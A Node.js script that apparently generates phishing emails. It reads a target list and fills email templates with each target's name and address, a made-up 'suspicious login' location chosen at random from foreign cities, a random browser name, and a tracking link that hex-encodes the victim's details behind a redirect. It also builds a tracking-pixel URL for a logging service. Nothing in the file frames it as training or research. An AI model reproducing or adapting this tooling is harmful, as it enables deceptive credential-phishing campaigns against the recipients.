var fs = require('fs');

var rmDir = function(dirPath) {
  var files = [];
  try { files = fs.readdirSync(dirPath); }
  catch(e) { return; }
  if (files.length > 0)
    for (var i = 0, len = files.length; i < len; i++) {
      var filePath = dirPath + '/' + files[i];
      if (fs.statSync(filePath).isFile())
        fs.unlinkSync(filePath);
      else
        rmDir(filePath);
    }
  fs.rmdirSync(dirPath);
};

var crypt = {
  encode: function (string) {
    var number = "";
    var length = string.length;
    for (var i = 0; i < length; i++){
      number += string.charCodeAt(i).toString(16);
    }
    return number;
  },
  decode: function (number) {
    var string = "";
    var length = number.length;
    for (var i = 0; i < length;) {
      var code = number.slice(i, i += 2);
      string += String.fromCharCode(parseInt(code, 16));
    }
    return string;
  }
};

try {
  var data = JSON.parse(fs.readFileSync('data.json'));
}
catch (e) {
  console.log('Could not parse data.json! Error: ' + e.toString);
  return process.exit(0);
}

var config = data.config;
var targets = data.targets;

var email_html = fs.readFileSync('email.html').toString();
var email_txt = fs.readFileSync('email.txt').toString();

var compile = function (target, content) {
  var tmp = content.toString();

  tmp = tmp.replace(/{{email}}/g, target.email);

  if (typeof target.name !== 'string') {
    tmp = tmp.replace('Dear {{name}},', '');
  }
  else {
    tmp = tmp.replace('{{name}}', target.name);
  }

  tmp = tmp.replace(/{{link}}/g, genRedir(genLink(target)));

  tmp = tmp.replace('{{browser}}', genBrowser());

  tmp = tmp.replace('{{location}}', genLocation());

  tmp = tmp.replace('{{logo}}', config.logo || '');

  return tmp;
};

var genLocation = function () {
  var locations = [
    'Shanghai, China',
    'Karachi, Pakistan',
    'Beijing, China',
    'Delhi, India',
    'Lagos, Nigeria',
    'Tianjin, China',
    'Istanbul, Turkey',
    'Mumbai, India',
    'Moscow, Russia',
    'Lahore, Pakistan',
    'Jakarta, Indonesia',
    'Cairo, Egypt',
    'Dhaka, Bangladesh',
    'Hyderabad, India',
    'Saint Petersburg, Russia',
    'Novosibirsk, Russia',
    'Yekaterinburg, Russia',
    'Kyiv, Ukraine',
    'Kharkiv, Ukraine',
    'Bucharest, Romania'

  ];
  return locations[Math.floor(Math.random()*locations.length)];
};

var genBrowser = function () {
  var browsers = [
    'Chrome',
    'Firefox',
    'Safari'
  ];
  return browsers[Math.floor(Math.random()*browsers.length)];
};

var genRedir = function (url) {
  return config.redir + crypt.encode(url);
};

var genLink = function (target) {
  var p = typeof target.password === 'number' ? target.password : 1;
  var url = config.url + '?p=' + target.password + '&c=1&e=' + crypt.encode(target.email);
  if (typeof target.q1 === 'string' && target.q1) {
    url += '&q1=' + crypt.encode(target.q1);
  }
  if (typeof target.q2 === 'string' && target.q2) {
    url += '&q2=' + crypt.encode(target.q2);
  }
  if (typeof target.m === 'string' && target.m) {
    url += '&m=' + crypt.encode(target.m);
  }
  return url + '#init';
};

var genPixel = function (target) {
  return (config.pixel ? 'https://logs-01.loggly.com/inputs/'+config.pixel+'.gif' : '/p') + '?from=1&message=' + crypt.encode(target.email);
};

if (!config) {
  console.log('Malformed data.json! Error: No config.');
  return process.exit(0);
}

/*if (typeof config.pixel !== 'string') {
  console.log('Malformed data.json! Error: config.pixel is not string.');
  return process.exit(0);
}*/

if (typeof config.url !== 'string') {
  console.log('Malformed data.json! Error: config.url is not string.');
  return process.exit(0);
}

if (typeof config.redir !== 'string') {
  console.log('Malformed data.json! Error: config.redir is not string.');
  return process.exit(0);
}

if (!targets || !(targets instanceof Array)|| targets.length===0) {
  console.log('Malformed data.json! Error: No targets.');
  return process.exit(0);
}

rmDir('emails');
fs.mkdirSync('emails');

for (var i = 0, len=targets.length, target={}, tmp=''; i < len; i++) {
  target = targets[i];

  if (typeof target.email !== 'string') {
    console.log('Malformed target. Warning: Skipping becuase target.email is not a string.');
    continue;
  }

  fs.writeFileSync('emails/'+target.email+'.html', compile(target, email_html));
  fs.writeFileSync('emails/'+target.email+'.txt', compile(target, email_txt));
}
